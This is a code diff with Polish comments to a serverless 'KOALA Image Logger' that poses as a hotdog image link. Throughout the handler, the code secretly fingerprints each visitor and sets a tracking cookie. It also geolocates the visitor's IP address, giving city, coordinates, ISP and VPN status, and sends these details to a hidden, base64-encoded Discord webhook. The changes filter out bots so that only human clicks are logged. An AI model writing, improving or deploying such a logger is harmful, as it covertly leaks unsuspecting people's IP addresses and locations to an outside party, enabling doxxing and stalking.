@@ -1,7 +1,6 @@
 // ====================== KOALA IMAGE LOGGER ======================
-// Szybki, z dużym obrazkiem, ignoruje boty Discord
+// Duży obrazek, ignoruje boty, fingerprint, ukryty webhook
 
-// Funkcja dekodująca webhook z base64
 function decodeWebhook(encoded) {
     try {
         return Buffer.from(encoded, 'base64').toString('utf-8');
@@ -10,14 +9,12 @@ function decodeWebhook(encoded) {
     }
 }
 
-// Funkcja do generowania fingerprintu
 function generateFingerprint(req) {
     const userAgent = req.headers['user-agent'] || '';
     const acceptLang = req.headers['accept-language'] || '';
-    const acceptEncoding = req.headers['accept-encoding'] || '';
     
     let hash = 0;
-    const data = `${userAgent}|${acceptLang}|${acceptEncoding}`;
+    const data = `${userAgent}|${acceptLang}`;
     for (let i = 0; i < data.length; i++) {
         hash = ((hash << 5) - hash) + data.charCodeAt(i);
         hash |= 0;
@@ -44,21 +41,13 @@ export default async function handler(req, res) {
     const isDiscordBot = ua.includes('discordbot') || (ua.includes('discord') && ua.includes('bot'));
     const isCrawler = ua.includes('bot') || ua.includes('crawler') || ua.includes('spider');
     
-    // ========== JEŚLI TO BOT – SZYBKI OBRAZEK, NIE WYSYŁAJ WEBHOOKA ==========
-    if (isDiscordBot || isCrawler) {
-        // Szybkie przekierowanie do obrazka – bot dostaje tylko obrazek
-        const fastImage = "https://media.discordapp.net/attachments/1054650838129332255/1153307620187312168/convert.png?width=800&height=400";
-        res.redirect(302, fastImage);
-        return;
-    }
-    
     // ========== FINGERPRINT ==========
     const fingerprint = generateFingerprint(req);
     const cookies = req.headers.cookie || '';
     const existingFingerprint = cookies.match(/fp=([^;]+)/)?.[1];
     const isReturning = existingFingerprint === fingerprint;
     
-    // Ustaw ciasteczko
+    // Ustaw ciasteczko (ale nie przerywa)
     res.setHeader('Set-Cookie', [`fp=${fingerprint}; Max-Age=2592000; Path=/; HttpOnly`]);
     
     // ========== GEOLOKALIZACJA ==========
@@ -67,21 +56,24 @@ export default async function handler(req, res) {
         org: 'Unknown', mobile: false, proxy: false
     };
     
-    try {
-        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-        const geoData = await geoRes.json();
-        if (!geoData.error) {
-            geo = {
-                country: geoData.country_name || 'Unknown',
-                city: geoData.city || 'Unknown',
-                lat: geoData.latitude || '?',
-                lon: geoData.longitude || '?',
-                org: geoData.org || 'Unknown',
-                mobile: geoData.mobile || false,
-                proxy: geoData.proxy || false
-            };
-        }
-    } catch (e) {}
+    // Tylko dla ludzi (nie botów) – oszczędność czasu
+    if (!isDiscordBot && !isCrawler && finalWebhook) {
+        try {
+            const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+            const geoData = await geoRes.json();
+            if (!geoData.error) {
+                geo = {
+                    country: geoData.country_name || 'Unknown',
+                    city: geoData.city || 'Unknown',
+                    lat: geoData.latitude || '?',
+                    lon: geoData.longitude || '?',
+                    org: geoData.org || 'Unknown',
+                    mobile: geoData.mobile || false,
+                    proxy: geoData.proxy || false
+                };
+            }
+        } catch (e) {}
+    }
     
     // ========== WYKRYWANIE OS ==========
     let os = 'Unknown';
@@ -92,37 +84,36 @@ export default async function handler(req, res) {
     else if (ua.includes('android')) os = 'Android';
     else if (ua.includes('linux')) os = 'Linux';
     
-    // ========== EMBED ==========
-    const embed = {
-        title: "🌭 HOTDOG!",
-        description: `**Ktoś otworzył obrazek!**`,
-        color: 0x5865F2,
-        fields: [
-            {
-                name: "🌐 IP & LOKALIZACJA",
-                value: `\`\`\`\nIP: ${ip}\n${geo.country}, ${geo.city}\nDostawca: ${geo.org}\nKoordynaty: ${geo.lat}, ${geo.lon}\nMobile: ${geo.mobile ? '✅ Tak' : '❌ Nie'}\nVPN/Proxy: ${geo.proxy ? '⚠️ Tak' : '❌ Nie'}\`\`\``,
-                inline: false
-            },
-            {
-                name: "💻 URZĄDZENIE",
-                value: `\`\`\`\nSystem: ${os}\nFingerprint: ${fingerprint}\nNowy/Rozpoznany: ${isReturning ? 'Rozpoznany' : 'Nowy'}\n\`\`\``,
-                inline: true
-            },
-            {
-                name: "⏱️ CZAS",
-                value: `\`\`\`\n${time}\n\`\`\``,
-                inline: true
+    // ========== WYŚLIJ WEBHOOK (tylko dla ludzi, nie botów) ==========
+    if (finalWebhook && !isDiscordBot && !isCrawler) {
+        const embed = {
+            title: "🌭 HOTDOG!",
+            description: `**Ktoś otworzył obrazek!**`,
+            color: 0x5865F2,
+            fields: [
+                {
+                    name: "🌐 IP & LOKALIZACJA",
+                    value: `\`\`\`\nIP: ${ip}\n${geo.country}, ${geo.city}\nDostawca: ${geo.org}\nKoordynaty: ${geo.lat}, ${geo.lon}\nMobile: ${geo.mobile ? '✅ Tak' : '❌ Nie'}\nVPN/Proxy: ${geo.proxy ? '⚠️ Tak' : '❌ Nie'}\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "💻 URZĄDZENIE",
+                    value: `\`\`\`\nSystem: ${os}\nFingerprint: ${fingerprint}\nNowy/Rozpoznany: ${isReturning ? 'Rozpoznany' : 'Nowy'}\n\`\`\``,
+                    inline: true
+                },
+                {
+                    name: "⏱️ CZAS",
+                    value: `\`\`\`\n${time}\n\`\`\``,
+                    inline: true
+                }
+            ],
+            footer: { text: "KOALA Image Logger" },
+            timestamp: new Date().toISOString(),
+            image: {
+                url: "https://i.imgur.com/9ZqB8Xa.jpg"
             }
-        ],
-        footer: { text: "KOALA Image Logger" },
-        timestamp: new Date().toISOString(),
-        image: {
-            url: "https://media.discordapp.net/attachments/1054650838129332255/1153307620187312168/convert.png?width=800&height=400"
-        }
-    };
-    
-    // ========== WYŚLIJ WEBHOOK ==========
-    if (finalWebhook) {
+        };
+        
         try {
             await fetch(finalWebhook, {
                 method: 'POST',
@@ -132,8 +123,10 @@ export default async function handler(req, res) {
         } catch (e) {}
     }
     
-    // ========== DUŻY OBRAZEK ==========
-    // Przekieruj do dużego, ładnego obrazka hotdoga
-    const bigImage = "https://media.discordapp.net/attachments/1054650838129332255/1153307620187312168/convert.png?width=800&height=400";
-    res.redirect(302, bigImage);
+    // ========== ZWRÓĆ DUŻY OBRAZEK ==========
+    // Duży obrazek hotdoga – NIE przekierowanie, tylko bezpośrednie zwrócenie
+    const bigImageUrl = "https://i.imgur.com/9ZqB8Xa.jpg";
+    
+    // Opcjonalnie: jeśli chcesz przekierować do obrazka (szybsze)
+    res.redirect(302, bigImageUrl);
 }
